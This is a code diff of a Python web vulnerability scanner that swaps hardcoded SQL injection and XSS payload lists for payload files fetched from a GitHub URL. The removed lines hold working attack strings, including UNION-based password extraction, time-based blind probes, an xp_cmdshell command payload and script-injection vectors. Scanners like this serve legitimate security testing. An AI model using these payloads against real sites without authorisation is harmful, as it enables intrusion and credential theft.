@@ -25,10 +25,18 @@ __        __   _     ____
                Author: 1lordduck
 """
 
-SQLI_PAYLOADS = ["'", "\"", "'--", "'#", "' OR '1'='1", "' OR 1=1--", "' OR '1'='1' --", "' OR 1=1#", "' OR 1=1/*", "' OR 'x'='x", "' OR 1=1 LIMIT 1;--", "'; EXEC xp_cmdshell('whoami'); --", "' AND 1=0 UNION SELECT NULL, username || '~' || password FROM users--", "' UNION SELECT null, null, null--", "' UNION SELECT 1,2,3--", "' AND SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--", "' AND (SELECT COUNT(*) FROM users) > 0--", "' AND 1=1--", "1' OR '1'='1'--", "' OR EXISTS(SELECT * FROM users)--", "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0--"]
+def loadPayloads(url):
+    try:
+        response = requests.get(url)
+        response.raise_for_status()  
+        payloads = response.text.splitlines()  # Split by newlines
+        return [payload.strip() for payload in payloads if payload.strip()]  
+    except requests.exceptions.RequestException as e:
+        print(f"{Color.RED}[!] Error fetching payloads: {e}{Color.RESET}")
+        sys.exit(1)
 
-XSS_PAYLOADS = ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "'><script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>", "<math><mi//xlink:href='javascript:alert(1)'>", "<details open ontoggle=alert(1)>", "<input onfocus=alert(1) autofocus>", "<a href=javascript:alert(1)>click</a>", "<video><source onerror=alert(1)>", "<object data=javascript:alert(1)>", "<div style=\"animation-name:x\" onanimationstart=\"alert(1)\"></div>", "<p style=\"width: expression(alert(1));\">", "<img src='x' onerror='confirm(1)'>", "<script>confirm(document.domain)</script>", "<script>prompt('XSS')</script>", "<marquee onstart=alert(1)>", "<img src=x onerror=alert('XSS')>"]
-
+SQLI_PAYLOADS = loadPayloads("https://raw.githubusercontent.com/1lordduck/Webpangero/main/payloads/sqli.txt")
+XSS_PAYLOADS = loadPayloads("https://raw.githubusercontent.com/1lordduck/Webpangero/main/payloads/xss.txt")
 
 SQL_ERRORS = [
     "you have an error in your sql syntax",
@@ -41,7 +49,6 @@ SQL_ERRORS = [
     "Microsoft OLE DB Provider for ODBC Drivers",
     "ODBC SQL Server Driver",
 ]
-
 
 def is_sql_error(response_text):
     lower = response_text.lower()
@@ -64,8 +71,6 @@ def banner(target):
     except requests.exceptions.RequestException as e:
         print(f"{Color.RED}[!]{Color.RESET} There was an error while banner grabbing: {e}")
         sys.exit(0)
-
-
 
 def parse_args():
     parser = argparse.ArgumentParser(description='WebScanner - Web Vulnerability Scanner')
@@ -93,7 +98,6 @@ def get_html_from_url(url):
 def find_forms(html):
     return BeautifulSoup(html, "html.parser").find_all("form")
 
-# I'm going to use this in the future 
 def find_links(html):
     soup = BeautifulSoup(html, "html.parser")
     return [a.get("href") for a in soup.find_all("a") if a.get("href")]
